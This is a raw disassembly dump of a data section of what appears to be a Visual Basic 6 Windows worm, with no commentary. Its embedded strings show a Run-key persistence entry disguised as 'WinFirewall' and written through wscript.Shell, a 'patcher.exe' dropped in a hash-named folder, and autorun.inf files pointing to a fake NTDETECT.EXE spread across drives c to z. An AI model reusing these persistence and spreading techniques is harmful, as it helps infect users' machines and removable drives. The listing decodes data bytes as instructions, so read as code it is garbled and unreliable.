  402c65:	65 a8 52             	gs test $0x52,%al
  402c68:	00 00                	add    %al,(%eax)
  402c6a:	00 00                	add    %al,(%eax)
  402c6c:	0a 00                	or     (%eax),%al
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	25 4e cd 91 19       	and    $0x1991cd4e,%eax
  402c75:	95                   	xchg   %eax,%ebp
  402c76:	ef                   	out    %eax,(%dx)
  402c77:	8b 2e                	mov    (%esi),%ebp
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 3a                	add    %bh,(%edx)
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 43 00             	add    %al,0x0(%ebx)
  402c82:	3a 00                	cmp    (%eax),%al
  402c84:	5c                   	pop    %esp
  402c85:	00 39                	add    %bh,(%ecx)
  402c87:	00 30                	add    %dh,(%eax)
  402c89:	00 35 00 63 00 30    	add    %dh,0x30006300
  402c8f:	00 37                	add    %dh,(%edi)
  402c91:	00 36                	add    %dh,(%esi)
  402c93:	00 39                	add    %bh,(%ecx)
  402c95:	00 66 00             	add    %ah,0x0(%esi)
  402c98:	39 00                	cmp    %eax,(%eax)
  402c9a:	61                   	popa
  402c9b:	00 30                	add    %dh,(%eax)
  402c9d:	00 36                	add    %dh,(%esi)
  402c9f:	00 63 00             	add    %ah,0x0(%ebx)
  402ca2:	39 00                	cmp    %eax,(%eax)
  402ca4:	35 00 61 00 32       	xor    $0x32006100,%eax
  402ca9:	00 34 00             	add    %dh,(%eax,%eax,1)
  402cac:	64 00 64 00 66       	add    %ah,%fs:0x66(%eax,%eax,1)
  402cb1:	00 39                	add    %bh,(%ecx)
  402cb3:	00 34 00             	add    %dh,(%eax,%eax,1)
  402cb6:	35 00 5c 00 00       	xor    $0x5c00,%eax
  402cbb:	00 23                	add    %ah,(%ebx)
  402cbd:	3d fb fc fa a0       	cmp    $0xa0fafcfb,%eax
  402cc2:	68 10 a7 38 08       	push   $0x838a710
  402cc7:	00 2b                	add    %ch,(%ebx)
  402cc9:	33 71 b5             	xor    -0x4b(%ecx),%esi
  402ccc:	22 3d fb fc fa a0    	and    0xa0fafcfb,%bh
  402cd2:	68 10 a7 38 08       	push   $0x838a710
  402cd7:	00 2b                	add    %ch,(%ebx)
  402cd9:	33 71 b5             	xor    -0x4b(%ecx),%esi
  402cdc:	02 00                	add    (%eax),%al
  402cde:	00 00                	add    %al,(%eax)
  402ce0:	bc 2c 40 00 cc       	mov    $0xcc00402c,%esp
  402ce5:	2c 40                	sub    $0x40,%al
  402ce7:	00 00                	add    %al,(%eax)
  402ce9:	00 00                	add    %al,(%eax)
  402ceb:	00 79 4f             	add    %bh,0x4f(%ecx)
  402cee:	ad                   	lods   %ds:(%esi),%eax
  402cef:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402cf5:	0c 00                	or     $0x0,%al
  402cf7:	aa                   	stos   %al,%es:(%edi)
  402cf8:	00 60 d3             	add    %ah,-0x2d(%eax)
  402cfb:	93                   	xchg   %eax,%ebx
  402cfc:	02 00                	add    (%eax),%al
  402cfe:	00 00                	add    %al,(%eax)
  402d00:	5c                   	pop    %esp
  402d01:	00 00                	add    %al,(%eax)
  402d03:	00 08                	add    %cl,(%eax)
  402d05:	00 00                	add    %al,(%eax)
  402d07:	00 2e                	add    %ch,(%esi)
  402d09:	00 65 00             	add    %ah,0x0(%ebp)
  402d0c:	78 00                	js     0x402d0e
  402d0e:	65 00 00             	add    %al,%gs:(%eax)
  402d11:	00 00                	add    %al,(%eax)
  402d13:	00 50 00             	add    %dl,0x0(%eax)
  402d16:	00 00                	add    %al,(%eax)
  402d18:	43                   	inc    %ebx
  402d19:	00 3a                	add    %bh,(%edx)
  402d1b:	00 5c 00 39          	add    %bl,0x39(%eax,%eax,1)
  402d1f:	00 30                	add    %dh,(%eax)
  402d21:	00 35 00 63 00 30    	add    %dh,0x30006300
  402d27:	00 37                	add    %dh,(%edi)
  402d29:	00 36                	add    %dh,(%esi)
  402d2b:	00 39                	add    %bh,(%ecx)
  402d2d:	00 66 00             	add    %ah,0x0(%esi)
  402d30:	39 00                	cmp    %eax,(%eax)
  402d32:	61                   	popa
  402d33:	00 30                	add    %dh,(%eax)
  402d35:	00 36                	add    %dh,(%esi)
  402d37:	00 63 00             	add    %ah,0x0(%ebx)
  402d3a:	39 00                	cmp    %eax,(%eax)
  402d3c:	35 00 61 00 32       	xor    $0x32006100,%eax
  402d41:	00 34 00             	add    %dh,(%eax,%eax,1)
  402d44:	64 00 64 00 66       	add    %ah,%fs:0x66(%eax,%eax,1)
  402d49:	00 39                	add    %bh,(%ecx)
  402d4b:	00 34 00             	add    %dh,(%eax,%eax,1)
  402d4e:	35 00 5c 00 70       	xor    $0x70005c00,%eax
  402d53:	00 61 00             	add    %ah,0x0(%ecx)
  402d56:	74 00                	je     0x402d58
  402d58:	63 00                	arpl   %eax,(%eax)
  402d5a:	68 00 65 00 72       	push   $0x72006500
  402d5f:	00 2e                	add    %ch,(%esi)
  402d61:	00 65 00             	add    %ah,0x0(%ebp)
  402d64:	78 00                	js     0x402d66
  402d66:	65 00 00             	add    %al,%gs:(%eax)
  402d69:	00 00                	add    %al,(%eax)
  402d6b:	00 1a                	add    %bl,(%edx)
  402d6d:	00 00                	add    %al,(%eax)
  402d6f:	00 77 00             	add    %dh,0x0(%edi)
  402d72:	73 00                	jae    0x402d74
  402d74:	63 00                	arpl   %eax,(%eax)
  402d76:	72 00                	jb     0x402d78
  402d78:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  402d7e:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  402d82:	68 00 65 00 6c       	push   $0x6c006500
  402d87:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  402d8b:	00 10                	add    %dl,(%eax)
  402d8d:	9d                   	popf
  402d8e:	0b 2a                	or     (%edx),%ebp
  402d90:	87 4b d3             	xchg   %ecx,-0x2d(%ebx)
  402d93:	11 a9 7a 00 10 4b    	adc    %ebp,0x4b10007a(%ecx)
  402d99:	36 5c                	ss pop %esp
  402d9b:	9f                   	lahf
  402d9c:	00 00                	add    %al,(%eax)
  402d9e:	00 00                	add    %al,(%eax)
  402da0:	80 2f 40             	subb   $0x40,(%edi)
  402da3:	00 8c 2d 40 00 00 00 	add    %cl,0x40(%ebp,%ebp,1)
  402daa:	00 00                	add    %al,(%eax)
  402dac:	d0 a3 b5 0a b6 e5    	shlb   $1,-0x1a49f54b(%ebx)
  402db2:	d0 11                	rclb   $1,(%ecx)
  402db4:	ab                   	stos   %eax,%es:(%edi)
  402db5:	f5                   	cmc
  402db6:	00 a0 c9 0f ff c0    	add    %ah,-0x3f00f037(%eax)
  402dbc:	a2 f5 c3 c7 a3       	mov    %al,0xa3c7c3f5
  402dc1:	88 d0                	mov    %dl,%al
  402dc3:	11 ab cb 00 a0 c9    	adc    %ebp,-0x365fff35(%ebx)
  402dc9:	0f ff c0             	ud0    %eax,%eax
  402dcc:	00 00                	add    %al,(%eax)
  402dce:	00 00                	add    %al,(%eax)
  402dd0:	98                   	cwtl
  402dd1:	00 00                	add    %al,(%eax)
  402dd3:	00 48 00             	add    %cl,0x0(%eax)
  402dd6:	4b                   	dec    %ebx
  402dd7:	00 45 00             	add    %al,0x0(%ebp)
  402dda:	59                   	pop    %ecx
  402ddb:	00 5f 00             	add    %bl,0x0(%edi)
  402dde:	4c                   	dec    %esp
  402ddf:	00 4f 00             	add    %cl,0x0(%edi)
  402de2:	43                   	inc    %ebx
  402de3:	00 41 00             	add    %al,0x0(%ecx)
  402de6:	4c                   	dec    %esp
  402de7:	00 5f 00             	add    %bl,0x0(%edi)
  402dea:	4d                   	dec    %ebp
  402deb:	00 41 00             	add    %al,0x0(%ecx)
  402dee:	43                   	inc    %ebx
  402def:	00 48 00             	add    %cl,0x0(%eax)
  402df2:	49                   	dec    %ecx
  402df3:	00 4e 00             	add    %cl,0x0(%esi)
  402df6:	45                   	inc    %ebp
  402df7:	00 5c 00 53          	add    %bl,0x53(%eax,%eax,1)
  402dfb:	00 4f 00             	add    %cl,0x0(%edi)
  402dfe:	46                   	inc    %esi
  402dff:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  402e03:	00 41 00             	add    %al,0x0(%ecx)
  402e06:	52                   	push   %edx
  402e07:	00 45 00             	add    %al,0x0(%ebp)
  402e0a:	5c                   	pop    %esp
  402e0b:	00 4d 00             	add    %cl,0x0(%ebp)
  402e0e:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  402e14:	6f                   	outsl  %ds:(%esi),(%dx)
  402e15:	00 73 00             	add    %dh,0x0(%ebx)
  402e18:	6f                   	outsl  %ds:(%esi),(%dx)
  402e19:	00 66 00             	add    %ah,0x0(%esi)
  402e1c:	74 00                	je     0x402e1e
  402e1e:	5c                   	pop    %esp
  402e1f:	00 57 00             	add    %dl,0x0(%edi)
  402e22:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  402e28:	6f                   	outsl  %ds:(%esi),(%dx)
  402e29:	00 77 00             	add    %dh,0x0(%edi)
  402e2c:	73 00                	jae    0x402e2e
  402e2e:	5c                   	pop    %esp
  402e2f:	00 43 00             	add    %al,0x0(%ebx)
  402e32:	75 00                	jne    0x402e34
  402e34:	72 00                	jb     0x402e36
  402e36:	72 00                	jb     0x402e38
  402e38:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  402e3c:	74 00                	je     0x402e3e
  402e3e:	56                   	push   %esi
  402e3f:	00 65 00             	add    %ah,0x0(%ebp)
  402e42:	72 00                	jb     0x402e44
  402e44:	73 00                	jae    0x402e46
  402e46:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  402e4c:	5c                   	pop    %esp
  402e4d:	00 52 00             	add    %dl,0x0(%edx)
  402e50:	75 00                	jne    0x402e52
  402e52:	6e                   	outsb  %ds:(%esi),(%dx)
  402e53:	00 5c 00 57          	add    %bl,0x57(%eax,%eax,1)
  402e57:	00 69 00             	add    %ch,0x0(%ecx)
  402e5a:	6e                   	outsb  %ds:(%esi),(%dx)
  402e5b:	00 46 00             	add    %al,0x0(%esi)
  402e5e:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  402e64:	77 00                	ja     0x402e66
  402e66:	61                   	popa
  402e67:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  402e6b:	00 00                	add    %al,(%eax)
  402e6d:	00 00                	add    %al,(%eax)
  402e6f:	00 52 00             	add    %dl,0x0(%edx)
  402e72:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  402e76:	77 00                	ja     0x402e78
  402e78:	72 00                	jb     0x402e7a
  402e7a:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  402e80:	00 00                	add    %al,(%eax)
  402e82:	00 00                	add    %al,(%eax)
  402e84:	30 00                	xor    %al,(%eax)
  402e86:	00 00                	add    %al,(%eax)
  402e88:	63 00                	arpl   %eax,(%eax)
  402e8a:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  402e8e:	66 00 67 00          	data16 add %ah,0x0(%edi)
  402e92:	68 00 69 00 6a       	push   $0x6a006900
  402e97:	00 6b 00             	add    %ch,0x0(%ebx)
  402e9a:	6c                   	insb   (%dx),%es:(%edi)
  402e9b:	00 6d 00             	add    %ch,0x0(%ebp)
  402e9e:	6e                   	outsb  %ds:(%esi),(%dx)
  402e9f:	00 6f 00             	add    %ch,0x0(%edi)
  402ea2:	70 00                	jo     0x402ea4
  402ea4:	71 00                	jno    0x402ea6
  402ea6:	72 00                	jb     0x402ea8
  402ea8:	73 00                	jae    0x402eaa
  402eaa:	74 00                	je     0x402eac
  402eac:	75 00                	jne    0x402eae
  402eae:	76 00                	jbe    0x402eb0
  402eb0:	77 00                	ja     0x402eb2
  402eb2:	78 00                	js     0x402eb4
  402eb4:	79 00                	jns    0x402eb6
  402eb6:	7a 00                	jp     0x402eb8
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	00 00                	add    %al,(%eax)
  402ebc:	06                   	push   %es
  402ebd:	00 00                	add    %al,(%eax)
  402ebf:	00 63 00             	add    %ah,0x0(%ebx)
  402ec2:	3a 00                	cmp    (%eax),%al
  402ec4:	5c                   	pop    %esp
  402ec5:	00 00                	add    %al,(%eax)
  402ec7:	00 61 4f             	add    %ah,0x4f(%ecx)
  402eca:	ad                   	lods   %ds:(%esi),%eax
  402ecb:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402ed1:	0c 00                	or     $0x0,%al
  402ed3:	aa                   	stos   %al,%es:(%edi)
  402ed4:	00 60 d3             	add    %ah,-0x2d(%eax)
  402ed7:	93                   	xchg   %eax,%ebx
  402ed8:	02 00                	add    (%eax),%al
  402eda:	00 00                	add    %al,(%eax)
  402edc:	24 00                	and    $0x0,%al
  402ede:	00 00                	add    %al,(%eax)
  402ee0:	0a 00                	or     (%eax),%al
  402ee2:	00 00                	add    %al,(%eax)
  402ee4:	2a 00                	sub    (%eax),%al
  402ee6:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  402eea:	78 00                	js     0x402eec
  402eec:	65 00 00             	add    %al,%gs:(%eax)
  402eef:	00 1a                	add    %bl,(%edx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	00 3a                	add    %bh,(%edx)
  402ef5:	00 5c 00 61          	add    %bl,0x61(%eax,%eax,1)
  402ef9:	00 75 00             	add    %dh,0x0(%ebp)
  402efc:	74 00                	je     0x402efe
  402efe:	6f                   	outsl  %ds:(%esi),(%dx)
  402eff:	00 72 00             	add    %dh,0x0(%edx)
  402f02:	75 00                	jne    0x402f04
  402f04:	6e                   	outsb  %ds:(%esi),(%dx)
  402f05:	00 2e                	add    %ch,(%esi)
  402f07:	00 69 00             	add    %ch,0x0(%ecx)
  402f0a:	6e                   	outsb  %ds:(%esi),(%dx)
  402f0b:	00 66 00             	add    %ah,0x0(%esi)
  402f0e:	00 00                	add    %al,(%eax)
  402f10:	12 00                	adc    (%eax),%al
  402f12:	00 00                	add    %al,(%eax)
  402f14:	5b                   	pop    %ebx
  402f15:	00 41 00             	add    %al,0x0(%ecx)
  402f18:	75 00                	jne    0x402f1a
  402f1a:	74 00                	je     0x402f1c
  402f1c:	6f                   	outsl  %ds:(%esi),(%dx)
  402f1d:	00 72 00             	add    %dh,0x0(%edx)
  402f20:	75 00                	jne    0x402f22
  402f22:	6e                   	outsb  %ds:(%esi),(%dx)
  402f23:	00 5d 00             	add    %bl,0x0(%ebp)
  402f26:	00 00                	add    %al,(%eax)
  402f28:	04 00                	add    $0x0,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	01 00                	add    %eax,(%eax)
  402f2e:	88 00                	mov    %al,(%eax)
  402f30:	24 00                	and    $0x0,%al
  402f32:	00 00                	add    %al,(%eax)
  402f34:	53                   	push   %ebx
  402f35:	00 68 00             	add    %ch,0x0(%eax)
  402f38:	65 00 6c 00 6c       	add    %ch,%gs:0x6c(%eax,%eax,1)
  402f3d:	00 3d 00 4e 00 54    	add    %bh,0x54004e00
  402f43:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  402f47:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  402f4b:	00 43 00             	add    %al,0x0(%ebx)
  402f4e:	54                   	push   %esp
  402f4f:	00 2e                	add    %ch,(%esi)
  402f51:	00 45 00             	add    %al,0x0(%ebp)
  402f54:	58                   	pop    %eax
  402f55:	00 45 00             	add    %al,0x0(%ebp)
  402f58:	00 00                	add    %al,(%eax)
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	1c 00                	sbb    $0x0,%al
  402f5e:	00 00                	add    %al,(%eax)
  402f60:	3a 00                	cmp    (%eax),%al
  402f62:	5c                   	pop    %esp
  402f63:	00 4e 00             	add    %cl,0x0(%esi)
  402f66:	54                   	push   %esp
  402f67:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  402f6b:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  402f6f:	00 43 00             	add    %al,0x0(%ebx)
  402f72:	54                   	push   %esp
  402f73:	00 2e                	add    %ch,(%esi)
  402f75:	00 45 00             	add    %al,0x0(%ebp)
  402f78:	58                   	pop    %eax
  402f79:	00 45 00             	add    %al,0x0(%ebp)
  402f7c:	00 00                	add    %al,(%eax)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	01 fe                	add    %edi,%esi
  402f82:	43                   	inc    %ebx
  402f83:	0d 93 f0 cf 11       	or     $0x11cff093,%eax
  402f88:	89 40 00             	mov    %eax,0x0(%eax)
  402f8b:	a0 c9 05 42 28       	mov    0x284205c9,%al
  402f90:	56                   	push   %esi
  402f91:	42                   	inc    %edx
  402f92:	41                   	inc    %ecx
  402f93:	36 2e 44             	ss cs inc %esp
  402f96:	4c                   	dec    %esp
  402f97:	4c                   	dec    %esp
  402f98:	00 00                	add    %al,(%eax)
  402f9a:	00 00                	add    %al,(%eax)
  402f9c:	5f                   	pop    %edi
  402f9d:	5f                   	pop    %edi
  402f9e:	76 62                	jbe    0x403002
  402fa0:	61                   	popa
  402fa1:	4e                   	dec    %esi
  402fa2:	65 78 74             	gs js  0x403019
  402fa5:	45                   	inc    %ebp
  402fa6:	61                   	popa
  402fa7:	63 68 43             	arpl   %ebp,0x43(%eax)
  402faa:	6f                   	outsl  %ds:(%esi),(%dx)
  402fab:	6c                   	insb   (%dx),%es:(%edi)
  402fac:	6c                   	insb   (%dx),%es:(%edi)
  402fad:	4f                   	dec    %edi
  402fae:	62 6a 00             	bound  %ebp,0x0(%edx)
  402fb1:	00 00                	add    %al,(%eax)
  402fb3:	00 5f 5f             	add    %bl,0x5f(%edi)
  402fb6:	76 62                	jbe    0x40301a
  402fb8:	61                   	popa
  402fb9:	46                   	inc    %esi
  402fba:	6f                   	outsl  %ds:(%esi),(%dx)
  402fbb:	72 45                	jb     0x403002
  402fbd:	61                   	popa
  402fbe:	63 68 43             	arpl   %ebp,0x43(%eax)
  402fc1:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc2:	6c                   	insb   (%dx),%es:(%edi)
  402fc3:	6c                   	insb   (%dx),%es:(%edi)
  402fc4:	4f                   	dec    %edi
  402fc5:	62 6a 00             	bound  %ebp,0x0(%edx)
  402fc8:	5f                   	pop    %edi
  402fc9:	5f                   	pop    %edi
  402fca:	76 62                	jbe    0x40302e
  402fcc:	61                   	popa
  402fcd:	43                   	inc    %ebx
  402fce:	61                   	popa
  402fcf:	73 74                	jae    0x403045
  402fd1:	4f                   	dec    %edi
  402fd2:	62 6a 00             	bound  %ebp,0x0(%edx)
  402fd5:	00 00                	add    %al,(%eax)
  402fd7:	00 5f 5f             	add    %bl,0x5f(%edi)
  402fda:	76 62                	jbe    0x40303e
  402fdc:	61                   	popa
  402fdd:	53                   	push   %ebx
  402fde:	74 72                	je     0x403052
  402fe0:	56                   	push   %esi
  402fe1:	61                   	popa
  402fe2:	72 56                	jb     0x40303a
  402fe4:	61                   	popa
  402fe5:	6c                   	insb   (%dx),%es:(%edi)
  402fe6:	00 00                	add    %al,(%eax)
  402fe8:	5f                   	pop    %edi
  402fe9:	5f                   	pop    %edi
  402fea:	76 62                	jbe    0x40304e
  402fec:	61                   	popa
  402fed:	50                   	push   %eax
  402fee:	72 69                	jb     0x403059
  402ff0:	6e                   	outsb  %ds:(%esi),(%dx)
  402ff1:	74 46                	je     0x403039
  402ff3:	69 6c 65 00 00 5f 5f 	imul   $0x765f5f00,0x0(%ebp,%eiz,2),%ebp
  402ffa:	76 
  402ffb:	62 61 56             	bound  %esp,0x56(%ecx)
  402ffe:	61                   	popa
  402fff:	72 43                	jb     0x403044
  403001:	61                   	popa
  403002:	74 00                	je     0x403004
  403004:	5f                   	pop    %edi
  403005:	5f                   	pop    %edi
  403006:	76 62                	jbe    0x40306a
  403008:	61                   	popa
  403009:	48                   	dec    %eax
  40300a:	72 65                	jb     0x403071
  40300c:	73 75                	jae    0x403083
  40300e:	6c                   	insb   (%dx),%es:(%edi)
  40300f:	74 43                	je     0x403054
  403011:	68 65 63 6b 4f       	push   $0x4f6b6365
  403016:	62 6a 00             	bound  %ebp,0x0(%edx)
  403019:	00 00                	add    %al,(%eax)
  40301b:	00 00                	add    %al,(%eax)
  40301d:	00 00                	add    %al,(%eax)
  40301f:	00 5f 5f             	add    %bl,0x5f(%edi)
  403022:	76 62                	jbe    0x403086
  403024:	61                   	popa
  403025:	53                   	push   %ebx
  403026:	74 72                	je     0x40309a
  403028:	56                   	push   %esi
  403029:	61                   	popa
  40302a:	72 4d                	jb     0x403079
  40302c:	6f                   	outsl  %ds:(%esi),(%dx)
  40302d:	76 65                	jbe    0x403094
  40302f:	00 5f 5f             	add    %bl,0x5f(%edi)
  403032:	76 62                	jbe    0x403096
  403034:	61                   	popa
  403035:	4c                   	dec    %esp
  403036:	65 6e                	outsb  %gs:(%esi),(%dx)
  403038:	42                   	inc    %edx
  403039:	73 74                	jae    0x4030af
  40303b:	72 00                	jb     0x40303d
  40303d:	00 00                	add    %al,(%eax)
  40303f:	00 5f 5f             	add    %bl,0x5f(%edi)
  403042:	76 62                	jbe    0x4030a6
  403044:	61                   	popa
  403045:	4f                   	dec    %edi
  403046:	62 6a 53             	bound  %ebp,0x53(%edx)
  403049:	65 74 41             	gs je  0x40308d
  40304c:	64 64 72 65          	fs fs jb 0x4030b5
  403050:	66 00 00             	data16 add %al,(%eax)
  403053:	00 5f 5f             	add    %bl,0x5f(%edi)
  403056:	76 62                	jbe    0x4030ba
  403058:	61                   	popa
  403059:	45                   	inc    %ebp
  40305a:	72 72                	jb     0x4030ce
  40305c:	6f                   	outsl  %ds:(%esi),(%dx)
  40305d:	72 4f                	jb     0x4030ae
  40305f:	76 65                	jbe    0x4030c6
  403061:	72 66                	jb     0x4030c9
  403063:	6c                   	insb   (%dx),%es:(%edi)
  403064:	6f                   	outsl  %ds:(%esi),(%dx)
  403065:	77 00                	ja     0x403067
  403067:	00 5f 5f             	add    %bl,0x5f(%edi)
  40306a:	76 62                	jbe    0x4030ce
  40306c:	61                   	popa
  40306d:	4c                   	dec    %esp
  40306e:	61                   	popa
  40306f:	74 65                	je     0x4030d6
  403071:	4d                   	dec    %ebp
  403072:	65 6d                	gs insl (%dx),%es:(%edi)
  403074:	43                   	inc    %ebx
  403075:	61                   	popa
  403076:	6c                   	insb   (%dx),%es:(%edi)
  403077:	6c                   	insb   (%dx),%es:(%edi)
  403078:	00 00                	add    %al,(%eax)
  40307a:	00 00                	add    %al,(%eax)
  40307c:	5f                   	pop    %edi
  40307d:	5f                   	pop    %edi
  40307e:	76 62                	jbe    0x4030e2
  403080:	61                   	popa
  403081:	56                   	push   %esi
  403082:	61                   	popa
  403083:	72 54                	jb     0x4030d9
  403085:	73 74                	jae    0x4030fb
  403087:	4e                   	dec    %esi
  403088:	65 00 00             	add    %al,%gs:(%eax)
  40308b:	00 5f 5f             	add    %bl,0x5f(%edi)
  40308e:	76 62                	jbe    0x4030f2
  403090:	61                   	popa
  403091:	46                   	inc    %esi
  403092:	72 65                	jb     0x4030f9
  403094:	65 4f                	gs dec %edi
  403096:	62 6a 00             	bound  %ebp,0x0(%edx)
  403099:	00 00                	add    %al,(%eax)
  40309b:	00 5f 5f             	add    %bl,0x5f(%edi)
  40309e:	76 62                	jbe    0x403102
  4030a0:	61                   	popa
  4030a1:	4f                   	dec    %edi
  4030a2:	62 6a 53             	bound  %ebp,0x53(%edx)
  4030a5:	65 74 00             	gs je  0x4030a8
  4030a8:	5f                   	pop    %edi
  4030a9:	5f                   	pop    %edi
  4030aa:	76 62                	jbe    0x40310e
  4030ac:	61                   	popa
  4030ad:	46                   	inc    %esi
  4030ae:	72 65                	jb     0x403115
  4030b0:	65 53                	gs push %ebx
  4030b2:	74 72                	je     0x403126
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 00                	add    %al,(%eax)
  4030b8:	5f                   	pop    %edi
  4030b9:	5f                   	pop    %edi
  4030ba:	76 62                	jbe    0x40311e
  4030bc:	61                   	popa
  4030bd:	53                   	push   %ebx
  4030be:	74 72                	je     0x403132
  4030c0:	43                   	inc    %ebx
  4030c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4030c2:	70 79                	jo     0x40313d
  4030c4:	00 00                	add    %al,(%eax)
  4030c6:	00 00                	add    %al,(%eax)
  4030c8:	5f                   	pop    %edi
  4030c9:	5f                   	pop    %edi
  4030ca:	76 62                	jbe    0x40312e
  4030cc:	61                   	popa
  4030cd:	4f                   	dec    %edi
  4030ce:	62 6a 56             	bound  %ebp,0x56(%edx)
  4030d1:	61                   	popa
  4030d2:	72 00                	jb     0x4030d4
  4030d4:	5f                   	pop    %edi
  4030d5:	5f                   	pop    %edi
  4030d6:	76 62                	jbe    0x40313a
  4030d8:	61                   	popa
  4030d9:	56                   	push   %esi
  4030da:	61                   	popa
  4030db:	72 53                	jb     0x403130
  4030dd:	65 74 56             	gs je  0x403136
  4030e0:	61                   	popa
  4030e1:	72 00                	jb     0x4030e3
  4030e3:	00 5f 5f             	add    %bl,0x5f(%edi)
  4030e6:	76 62                	jbe    0x40314a
  4030e8:	61                   	popa
  4030e9:	46                   	inc    %esi
  4030ea:	72 65                	jb     0x403151
  4030ec:	65 4f                	gs dec %edi
  4030ee:	62 6a 4c             	bound  %ebp,0x4c(%edx)
  4030f1:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  4030f8:	5f                   	pop    %edi
  4030f9:	5f                   	pop    %edi
  4030fa:	76 62                	jbe    0x40315e
  4030fc:	61                   	popa
  4030fd:	46                   	inc    %esi
  4030fe:	72 65                	jb     0x403165
  403100:	65 53                	gs push %ebx
  403102:	74 72                	je     0x403176
  403104:	4c                   	dec    %esp
  403105:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  40310c:	5f                   	pop    %edi
  40310d:	5f                   	pop    %edi
  40310e:	76 62                	jbe    0x403172
  403110:	61                   	popa
  403111:	53                   	push   %ebx
  403112:	74 72                	je     0x403186
  403114:	43                   	inc    %ebx
  403115:	61                   	popa
  403116:	74 00                	je     0x403118
  403118:	5f                   	pop    %edi
  403119:	5f                   	pop    %edi
  40311a:	76 62                	jbe    0x40317e
  40311c:	61                   	popa
  40311d:	53                   	push   %ebx
  40311e:	74 72                	je     0x403192
  403120:	4d                   	dec    %ebp
  403121:	6f                   	outsl  %ds:(%esi),(%dx)
  403122:	76 65                	jbe    0x403189
  403124:	00 00                	add    %al,(%eax)
  403126:	00 00                	add    %al,(%eax)
  403128:	5f                   	pop    %edi
  403129:	5f                   	pop    %edi
  40312a:	76 62                	jbe    0x40318e
  40312c:	61                   	popa
  40312d:	4e                   	dec    %esi
  40312e:	65 77 32             	gs ja  0x403163
  403131:	00 00                	add    %al,(%eax)
  403133:	00 bc 2c 40 00 d4 62 	add    %bh,0x62d40040(%esp,%ebp,1)
  40313a:	40                   	inc    %eax
  40313b:	00 5f 5f             	add    %bl,0x5f(%edi)
  40313e:	76 62                	jbe    0x4031a2
  403140:	61                   	popa
  403141:	45                   	inc    %ebp
  403142:	6e                   	outsb  %ds:(%esi),(%dx)
  403143:	64 00 00             	add    %al,%fs:(%eax)
  403146:	00 00                	add    %al,(%eax)
  403148:	5f                   	pop    %edi
  403149:	5f                   	pop    %edi
  40314a:	76 62                	jbe    0x4031ae
  40314c:	61                   	popa
  40314d:	46                   	inc    %esi
  40314e:	72 65                	jb     0x4031b5
  403150:	65 56                	gs push %esi
  403152:	61                   	popa
  403153:	72 4c                	jb     0x4031a1
  403155:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  40315c:	5f                   	pop    %edi
  40315d:	5f                   	pop    %edi
  40315e:	76 62                	jbe    0x4031c2
  403160:	61                   	popa
  403161:	56                   	push   %esi
  403162:	61                   	popa
  403163:	72 44                	jb     0x4031a9
  403165:	75 70                	jne    0x4031d7
  403167:	00 5f 5f             	add    %bl,0x5f(%edi)
  40316a:	76 62                	jbe    0x4031ce
  40316c:	61                   	popa
  40316d:	49                   	dec    %ecx
  40316e:	32 49 34             	xor    0x34(%ecx),%cl
  403171:	00 00                	add    %al,(%eax)
  403173:	00 5f 5f             	add    %bl,0x5f(%edi)
  403176:	76 62                	jbe    0x4031da
  403178:	61                   	popa
  403179:	45                   	inc    %ebp
  40317a:	78 69                	js     0x4031e5
  40317c:	74 50                	je     0x4031ce
  40317e:	72 6f                	jb     0x4031ef
  403180:	63 00                	arpl   %eax,(%eax)
  403182:	00 00                	add    %al,(%eax)
  403184:	5f                   	pop    %edi
  403185:	5f                   	pop    %edi
  403186:	76 62                	jbe    0x4031ea
  403188:	61                   	popa
  403189:	50                   	push   %eax
  40318a:	75 74                	jne    0x403200
  40318c:	4f                   	dec    %edi
  40318d:	77 6e                	ja     0x4031fd
  40318f:	65 72 34             	gs jb  0x4031c6
  403192:	00 00                	add    %al,(%eax)
  403194:	5f                   	pop    %edi
  403195:	5f                   	pop    %edi
  403196:	76 62                	jbe    0x4031fa
  403198:	61                   	popa
  403199:	50                   	push   %eax
  40319a:	75 74                	jne    0x403210
  40319c:	4f                   	dec    %edi
  40319d:	77 6e                	ja     0x40320d
  40319f:	65 72 33             	gs jb  0x4031d5
  4031a2:	00 00                	add    %al,(%eax)
  4031a4:	5f                   	pop    %edi
  4031a5:	5f                   	pop    %edi
  4031a6:	76 62                	jbe    0x40320a
  4031a8:	61                   	popa
  4031a9:	4f                   	dec    %edi
  4031aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4031ab:	45                   	inc    %ebp
  4031ac:	72 72                	jb     0x403220
  4031ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4031af:	72 00                	jb     0x4031b1
